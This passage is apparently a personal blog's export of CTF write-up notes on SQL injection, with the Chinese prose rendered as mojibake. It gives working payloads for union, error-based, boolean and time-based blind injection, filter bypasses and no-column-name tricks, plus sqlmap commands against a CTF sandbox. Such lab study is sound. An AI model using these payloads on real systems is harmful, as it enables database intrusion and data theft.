ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“[MyISAM|CSV|InnoDB] Version ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼10 Row_format è¡Œæ ¼å¼[Compact|Dynamic|Fixed] Table_rows è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ® Avg_row_length å¹³å‡è¡Œé•¿åº¦ Data_length æ•°æ®é•¿åº¦ Max_data_length æœ€å¤§æ•°æ®é•¿åº¦ Index_length ç´¢å¼•é•¿åº¦ Data_free ç©ºé—´ç¢ç‰‡ Auto_increment åšè‡ªå¢ä¸»é”®çš„è‡ªåŠ¨å¢é‡å½“å‰å€¼ Create_time è¡¨çš„åˆ›å»ºæ—¶é—´ Update_time è¡¨çš„æ›´æ–°æ—¶é—´ Check_time è¡¨çš„æ£€æŸ¥æ—¶é—´ Table_collation è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›† Checksum æ ¡éªŒå’Œ Create_options åˆ›å»ºé€‰é¡¹ Table_comment è¡¨çš„æ³¨é‡Šã€å¤‡æ³¨ ç¡®å®šå­—æ®µå çŒœæµ‹flagåº”è¯¥åœ¨l0ve1ysq1è¡¨ä¸­ï¼Œå› æ­¤æŸ¥æ‰¾è¯¥è¡¨å†…çš„å­—æ®µå 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;# 8.æ‹¿åˆ°æ•°æ® æŸ¥æ‰¾è¿™ä¸‰åˆ—ä¸­çš„å…¨éƒ¨æ•°æ®ï¼Œåˆ©ç”¨group_concat(); 1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#; å¾—åˆ°flag MySQLé»˜è®¤æœ‰â€œinformation_schemaâ€çš„æ•°æ®åº“ï¼Œè¯¥åº“ä¸­æœ‰ä¸‰ä¸ªè¡¨åï¼š 1ã€SCHEMATAï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼Œè®°å½•åº“åçš„å­—æ®µä¸ºSCHEMA_NAMEã€‚2ã€TABLESï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åï¼Œè®°å½•åº“åå’Œè¡¨åçš„å­—æ®µä¸ºTABLE_SCHEMAå’ŒTABLE_NAMEã€‚3ã€COLUMNSï¼šå­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåï¼Œåº“åã€è¡¨åå’Œå­—æ®µåä¸ºTABLE_SCHEMAã€TABLE_NAMEå’ŒCOLUMN_NAMEã€‚ ctfhubâ€”SQL æ•´æ•°å‹æ³¨å…¥è¾“å…¥1æœ‰å›æ˜¾ è¾“å…¥1 and 1=2æ— å›æ˜¾ï¼Œæ—¢å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ•´æ•°å‹æ³¨å…¥ åˆ©ç”¨order byå¯çŸ¥å­˜åœ¨ä¸¤ä¸ªå­—æ®µ åˆ©ç”¨è”åˆæŸ¥è¯¢æŸ¥è¯¢æ•°æ®åº“åç§° å†æŸ¥æ‰¾è¡¨å flagåº”è¯¥å°±åœ¨flagè¡¨å†…ï¼Œå†æŸ¥æ‰¾å­—æ®µå æœ€åå¾—åˆ°flag ctfhubâ€”SQLå­—ç¬¦å‹æ³¨å…¥åˆ©ç”¨order byåˆ¤æ–­å­—æ®µæ•° è¾“å…¥-1&#39; union select 1,2#åˆ¤æ–­å›æ˜¾ä½ç½® æŸ¥æ•°æ®åº“å æŸ¥è¡¨å æŸ¥å­—æ®µå æŸ¥flag -1&#39; union select 1,group_concat(flag) from flag# æ„Ÿè§‰å’Œæ•´æ•°å‹æ³¨å…¥å·®ä¸å¤š ctfhubâ€”æŠ¥é”™æ³¨å…¥åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨extractvalueå’Œupdatexmlä¸¤ä¸ªå‡½æ•°ã€‚ extractvalue() å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string) æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸² ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸² ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ payloadæ¨¡æ¿ &#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) 0x7e=â€™~â€™ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€ version()=@@version â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$&#39;ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½ è¿”å›ç»“æœä¸èƒ½è¶…è¿‡ä¸€æ¡ è‹¥è¶…è¿‡åˆ™éœ€å†æŸ¥è¯¢è¯­å¥åæ·»åŠ limit x,1æˆ–ç”¨group_concat()å‡½æ•° updatexml() updatexml()å‡½æ•°ä¸extractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚ and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1)) flood() åŸç†è¿˜æ²¡çœ‹æ˜ç™½ï¼ˆ å…ˆæ”¾ä¸ªæ¨¡æ¿åœ¨è¿™ 1 Union select count(*),concat((æŸ¥è¯¢è¯­å¥),0x26,floor(rand(0)*2))x from information_schema.columns group by x; é¢˜ç›®ï¼š åˆ©ç”¨extractvalue è¾“å…¥å•å¼•å·æç¤ºè¯­æ³•é”™è¯¯ï¼Œè¾“å…¥and 1=1èƒ½æ­£ç¡®æŸ¥è¯¢ï¼ŒçŒœæµ‹ä¸ºæ•°å­—å‹ï¼Œåˆ©ç”¨extractvalueå‡½æ•°çˆ†åº“å å†çˆ†è¡¨å è¿™é‡Œæç¤ºå¤ªé•¿å› æ­¤åˆ©ç”¨group_concat()å‡½æ•° çŒœåˆ°flagå†flagè¡¨å†…çˆ†åˆ—å æœ€åæŸ¥è¯¢å†…å®¹ 1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)) ç”±äºextractvalueå‡½æ•°åªèƒ½æ˜¾ç¤º32ä½å­—ç¬¦ï¼Œæ‰€ä»¥è¦åˆ©ç”¨substringå‡½æ•°è¿›è¡Œåˆ†å‰² åˆ©ç”¨substringæŸ¥çœ‹å³è¾¹31ä½å­—ç¬¦ æœ€åå¯ä»¥æ‹¿åˆ°flag ctfhub{ff3bb0327849e1b9e0e6abfd} åˆ©ç”¨updataxmlå‡½æ•° åˆ©ç”¨floodå‡½æ•° ctfhubâ€”å¸ƒå°”ç›²æ³¨åªæœ‰å‡ºç°æ•°æ®æäº¤æ­£ç¡®å’Œé”™è¯¯ä¸¤ç§ä¸åŒçš„é¡µé¢ï¼ˆæŠ¥é”™å‹è‡³å°‘è¯­æ³•é”™è¯¯ä¼šå›æ˜¾é”™è¯¯åˆ°é¡µé¢ä¸Šï¼‰æˆ–è€…æ— æ³•ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚ æ­¥éª¤ ç”¨é”™è¯¯å’Œæ­£ç¡®ä¸¤ç§åé¦ˆè¿›è¡Œé€ä¸€è¯•éªŒï¼ŒçŒœæµ‹å‡ºé—­åˆ åˆ©ç”¨lengthæ¥é€ä¸€æµ‹è¯•å­—ç¬¦ä¸²çš„é•¿åº¦ åˆ©ç”¨substræ¥é€ä¸€çš„æµ‹è¯•ï¼Œæµ‹è¯•åº“åã€è¡¨åã€åˆ—åå’Œå…¶ä»–æ•°æ® æœ€åå¾—åˆ°æ•°æ® å‡½æ•° length() è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ length(abc) è¿”å›3ï¼Œè¡¨ç¤ºabcå­—ç¬¦ä¸²é•¿åº¦ä¸º3 substr() æˆªå–å­—ç¬¦ä¸² substr(abc,1,1) è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹æˆªå–ï¼Œæ­¥é•¿ä¸º1 mid() å–å‡ºå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†å€¼ mid(abc,1,1) è¿”å›aï¼Œä»abcçš„ç¬¬ä¸€ä½å¼€å§‹å–ï¼Œæ­¥é•¿ä¸º1ï¼Œ ä¸substr()ç”¨æ³•ä¸€è‡´ left() å–å‡ºå­—ç¬¦ä¸²å·¦è¾¹çš„å‡ ä¸ªæ•°æ® left(abc,1) è¿”å›a left(abc,2) è¿”å›ab right() å–å‡ºå³è¾¹çš„å‡ ä¸ªæ•°æ® right(abc,1) è¿”å›c right(abc,2) è¿”å›bc ord() ä¸ascii() è¿”å›ä¸€ä¸ªå­—ç¬¦çš„asciiç å€¼ ascii(s) è¿”å›114 hex() è¿”å›16è¿›åˆ¶æ•° å…ˆçŒœæ•°æ®åº“é•¿åº¦&gt;3æ—¶è¿”å›æˆåŠŸï¼Œ&gt;4æ—¶è¿”å›å¤±è´¥å¯ä»¥å¾—åˆ°æ•°æ®åº“åé•¿åº¦ä¸º4 æ¥ä¸‹æ¥åˆ©ç”¨substrå’Œasciiå‡½æ•°çŒœåå­— é¦–å­—æ¯asciiç å¤§äº114æ—¶è¿”å›æˆåŠŸï¼Œå¤§äº115æ—¶è¿”å›å¤±è´¥ï¼Œå¯å¾—åˆ°é¦–å­—æ¯çš„asciiç ä¸º115ï¼Œä¸ºs ç¬¬äºŒä½åŒç†å¯ä»¥å¾—åˆ°asciiç å€¼ä¸º113ï¼Œä¸ºq æœ€åå¯å¾—æ•°æ®åº“åä¸ºsqli å†çŒœè¡¨å 1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39; ï¼ˆæ„Ÿè§‰è¿™éƒ¨åˆ†åº”è¯¥ç”¨bpæŠ“åŒ…çˆ†ç ´æ›´æ–¹ä¾¿ï¼‰ å§limitåçš„0æ”¹ä¸º1çŒœç¬¬äºŒä¸ªè¡¨å æœ€åèƒ½å¾—åˆ°æœ‰newså’Œflagä¸¤ä¸ªè¡¨ å†çŒœå­—æ®µ é¦–å­—æ¯asciiç ä¸º102ï¼Œä¸ºf åŒç†èƒ½å¾—åˆ°å­—æ®µåä¸ºflag æœ€åçˆ†å†…å®¹ å¤ªå¤šäº†ï¼Œç”¨bpçˆ†ç ´å®Œæ„Ÿè§‰ä¹Ÿå¾ˆéš¾æ‰¾ï¼Œä¼°è®¡ç”¨pyå†™è„šæœ¬ä¼šæ–¹ä¾¿å¾ˆå¤š ç”¨sqlmapï¼š -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 --dbsæŸ¥åº“å -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables æŸ¥è¡¨å -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columnsæŸ¥å­—æ®µå -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dumpæŸ¥å€¼ ctfhubâ€”æ—¶é—´ç›²æ³¨åˆ©ç”¨sleepå‡½æ•°è¿›è¡Œç›²æ³¨ è‹¥andä¹‹å‰çš„è¯­å¥æ­£ç¡®åˆ™æˆåŠŸæ‰§è¡Œsleep èƒ½å¾—åˆ°æ˜¯æ•°å­—å‹æ³¨å…¥ æ¥ä¸‹æ¥åˆ©ç”¨ifè¯­å¥è¿›è¡Œæ³¨å…¥æ˜¯å¦æˆåŠŸçš„åˆ¤æ–­1 and if(æŸ¥è¯¢è¯­å¥,sleep(2),1) è‹¥ä¸ºçœŸåˆ™æ‰§è¡Œsleepï¼ˆ2ï¼‰ï¼Œè‹¥ä¸ºå‡åˆ™æ‰§è¡Œ1 æ¥ä¸‹æ¥æ­¥éª¤ä¸å¸ƒå°”ç›²æ³¨ç›¸ä¼¼ çŒœæ•°æ®åº“åï¼ˆä¹Ÿå¯ä»¥åˆ©ç”¨asciiç æ¥çŒœï¼Œä½†å› ä¸ºctfhubçš„sqlé¢˜åç§°éƒ½ä¸€æ ·ï¼Œå°±ç›´æ¥è¯•å­—ç¬¦äº†ï¼‰ 1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)# çŒœè¡¨çš„æ•°é‡ 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(2),1)# çŒœè¡¨å 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)# å°†limitåçš„0æ”¹ä¸º1å†çŒœç¬¬äºŒä¸ªè¡¨å åˆ†åˆ«ä¸ºnews å’Œ flag çŒœflagè¡¨å†…å­—æ®µæ•°é‡ 1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(2),1)# çŒœå­—æ®µå 1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)# æœ€ç»ˆå¯ä»¥çŒœå‡ºå­—æ®µåä¸ºflag å†çŒœå†…å®¹ 1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)# è¿™éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯è¦ç”¨pythonæˆ–è€…sqlmap è¿‡æ»¤ç©ºæ ¼çœ‹é¢˜ç›®å°±çŸ¥é“ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨/**/æ³¨é‡Šç¬¦æ¥æ›¿ä»£ç©ºæ ¼ï¼Œå…¶ä»–æ­¥éª¤å’Œå­—ç¬¦å‹æ³¨å…¥ä¸€æ · æœ€åå¾—åˆ°flag è´´ä¸ªåˆ«äººæ€»ç»“çš„è¿‡æ»¤å’Œç»•è¿‡ SQLæ³¨å…¥ä¸€äº›è¿‡æ»¤åŠç»•è¿‡æ€»ç»“_obsetearçš„åšå®¢-CSDNåšå®¢ [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLçœ‹åˆ°ç•Œé¢æç¤ºå­˜åœ¨è¿‡æ»¤ è¾“å…¥1&#39; and 1=1# 1â€˜ or 1# 1&#39; and select 1 from 1#ç­‰è¯­å¥æ ¹æ®è¿”å›çš„é”™è¯¯ä¿¡æ¯å¯ä»¥çŸ¥é“è¿‡æ»¤äº†select or and union from by where è¿™é‡Œå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡ï¼Œé¦–å…ˆåˆ©ç”¨order byæŸ¥å­—æ®µæ•°å¯ä»¥æŸ¥åˆ°è¡¨å†…æœ‰ä¸‰åˆ— 1&#39; oorrder bbyy 4;# æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢ å…ˆçœ‹å›æ˜¾1&#39; ununionion selselectect 1,2,3;# æŸ¥åº“å1&#39; ununionion selselectect 1,2,database();# æŸ¥è¡¨å 1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());# flagåº”è¯¥åœ¨b4bsqlè¡¨é‡Œï¼Œçˆ†ä¸€ä¸‹åˆ—å 1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);# æœ€åçˆ†å†…å®¹1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);# [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLè¯•äº†ä¸€ä¸‹ï¼Œand union ç©ºæ ¼ ç­‰äºéƒ½è¢«è¿‡æ»¤äº†å°è¯•äº†å‡ ç§ç»•è¿‡å§¿åŠ¿éƒ½æ²¡æˆåŠŸï¼Œçœ‹äº†ä¸‹åˆ«äººçš„wpè¯´æ˜¯æŠ¥é”™æ³¨å…¥ åˆ©ç”¨æ‹¬å·æ¥å»æ‰æŸ¥è¯¢è¯­å¥ä¸­çš„ç©ºæ ¼ å…ˆæŸ¥åº“ 0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))# å†æŸ¥è¡¨ ç”±äºç­‰äºå·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ç”¨like admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))# çˆ†åˆ—å admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))# æœ€åçˆ†å†…å®¹ admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))# flag{66f2f5cd-207d-4d50-87 ç”±äºextractvalueæ˜¾ç¤ºå­—ç¬¦æ•°çš„é™åˆ¶ï¼Œè¦ç”¨substrå‡½æ•°å¯¹å…¶è¿›è¡Œåˆ†å‰² admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))# cd-207d-4d50-87bd-d8b762ffce95} æœ€åæ‹¼ä¸€ä¸‹å¾—åˆ°flag flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95} [SWPU2019]Web1è¿›å…¥åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ³¨å†Œä¸ªè´¦å·ä¹‹åç™»å½• å¯ä»¥çŸ¥é“æ³¨å…¥ç‚¹åœ¨å¹¿å‘Šä½ä¸Š è¯•ä¸€ä¸‹å¯ä»¥çŸ¥é“or and #éƒ½è¢«è¿‡æ»¤äº† å› ä¸ºè¿‡æ»¤äº†ï¼ƒå·ï¼Œæ‰€ä»¥è¦ä¿è¯åé¢çš„å•å¼•å·èƒ½é—­åˆ 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;â€˜1â€™&#x3D;â€˜1 å¾—åˆ°å›æ˜¾ä½ç½®2ï¼Œ3. å› ä¸ºorè¢«è¿‡æ»¤ï¼Œä¸”æ— æ³•é€šè¿‡å¤§å°å†™å’ŒåŒå†™ç»•è¿‡ï¼Œé‚£ä¹ˆinformation_schemaå› ä¸ºå«æœ‰orï¼Œæ‰€ä»¥ä¹Ÿæ²¡æ³•ä½¿ç”¨ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ SQLæ³¨å…¥ï¼šé™åˆ¶æ¡ä»¶ä¸‹è·å–è¡¨åã€æ— åˆ—åæ³¨å…¥ - MustaphaMond - åšå®¢å›­ (cnblogs.com) InnoDbå¼•æ“ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚sysæ•°æ®åº“åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚ sysæ•°æ®åº“éœ€è¦rootæƒé™ï¼Œè€ŒinnoDbåœ¨mysqlä¸­é»˜è®¤å…³é—­ é™åˆ¶ï¼šmysql â‰¥ 5.7ç‰ˆæœ¬ å…ˆæŸ¥ä¸€ä¸‹æ•°æ®åº“ç‰ˆæœ¬ å› æ­¤å¯ä»¥åˆ©ç”¨innoDbæ¥æŸ¥è¡¨å ç³»ç»ŸMysqlåº“ä¸­å­˜åœ¨ä¸¤å¼ ä¸innodbç›¸å…³çš„è¡¨ï¼šinnodb_table_statså’Œinnodb_index_statsã€‚ æ‰€ä»¥å¯ä»¥é€šè¿‡æŸ¥æ‰¾è¿™ä¸¤ä¸ªè¡¨å–ä»£informationçš„ä½œç”¨ 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 æˆ– 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 å¾—åˆ°è¡¨åä¸ºadså’Œusers çŒœflagåœ¨usersè¡¨å†…ï¼Œè¿›è¡Œæ— åˆ—åæ³¨å…¥ æ— åˆ—åæ³¨å…¥åŸç† æ— åˆ—åæ³¨å…¥çš„åŸç†å°±æ˜¯åœ¨å–åˆ«åçš„åŒæ—¶æŸ¥è¯¢æ•°æ®ã€‚é€šè¿‡æ— åˆ—åæŸ¥è¯¢æ„é€ ä¸€ä¸ªè™šæ‹Ÿè¡¨ï¼Œåœ¨æ„é€ æ­¤è¡¨çš„åŒæ—¶æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ã€‚ è¡¨çš„åˆ—æ•°ä¹Ÿè¦ä¸€æ¬¡æ¬¡è¯• ï¼ˆä¸å¤ªæ‡‚ä¸ºå•¥è¿™é‡Œçš„åˆ—æ•°ä¸æ˜¯22) CTF|mysqlä¹‹æ— åˆ—åæ³¨å…¥ - çŸ¥ä¹ (zhihu.com) [SWPU2019]Web1 - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com) 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2, (select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1 å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼Œå°±è¦å¯¹å­—æ®µåˆ©ç”¨åˆ«åæ›¿ä»£ è¿˜å¯ä»¥åˆ©ç”¨joinçˆ†åˆ—å joinåçš„åˆ—åæ˜¯ä¸¤ä¸ªè¡¨åˆ—ååŠ èµ·æ¥çš„ï¼Œå¯èƒ½ä¼šäº§â½£ç›¸åŒçš„åˆ—åï¼Œå¦‚idå’Œnameï¼Œä½¿â½¤åˆ«åæ—¶ï¼Œè¡¨ä¸­ä¸èƒ½å‡ºç°åŒçš„å­—æ®µåï¼Œè¿™å°±è·Ÿjoinç¬¬â¼€ä¸ªç‰¹ç‚¹ç›¸å†²çªï¼Œæ‰€ä»¥åœ¨joinå’Œåˆ«ååŒæ—¶ä½¿â½¤æ—¶ä¼šå¯¼è‡´æŠ¥é”™ å½“é€šè¿‡æŸ¥è¯¢å¾—åˆ°æ–°çš„è¡¨æ—¶ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªåˆ«åï¼Œå³æ¯ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„è¡¨éƒ½å¿…é¡»æœ‰ä¸€ä¸ªè‡ªå·±çš„åˆ«å äºŒæ¬¡æ³¨å…¥åŸç† äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ äºŒæ¬¡æ³¨å…¥ï¼Œå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤æ­¥: ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ® è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ® å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ æ— åˆ—åæ³¨å…¥ï¼Ÿ (strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23 ||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23 username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23 YouAresOgOoD select(table_name)from(information_schema.tables)where(table_schema=database()) ||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),Â§1Â§,1))=Â§0Â§)%23 flag_1s_her3 ||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),Â§1Â§,1))=Â§0Â§)%23 flag{sql1_1s_s0_ea3y}","categories":[],"tags":[{"name":"webå­¦ä¹ ","slug":"webå­¦ä¹ ","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"my-first-blog","slug":"my-first-blog","date":"2021-06-14T16:32:18.000Z","updated":"2022-01-17T05:59:22.993Z","comments":true,"path":"2021/06/15/my-first-blog/","link":"","permalink":"https://ethe448.github.io/2021/06/15/my-first-blog/","excerpt":"","text":"æˆåŠŸæ­å»ºblogæµ‹è¯•ä¸€ä¸‹å†™åšå®¢","categories":[],"tags":[{"name":"test 